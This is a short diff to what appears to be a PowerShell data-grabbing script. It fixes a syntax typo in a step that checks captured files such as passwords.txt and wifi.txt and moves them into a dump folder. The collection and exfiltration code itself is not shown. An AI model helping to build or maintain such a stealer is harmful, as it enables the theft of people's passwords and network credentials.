@@ -65,7 +65,7 @@ Start-Sleep -Seconds 2
 # Vérification et sécurisation des fichiers générés
 foreach ($file in @("passwords.txt", "wifi.txt", "history.txt", "connected_devices.txt")) {
     $filePath = "$basePath\$file"
-    if (!(Test-Path $filePath) -or ((Get-Item$ filePath).Length -eq 0)) {
+    if (!(Test-Path $filePath) -or ((Get-Item $filePath).Length -eq 0)) {
         Set-Content -Path $filePath -Value "No data captured"
     }
     Move-Item $filePath -Destination "$dumpFolder" -Force
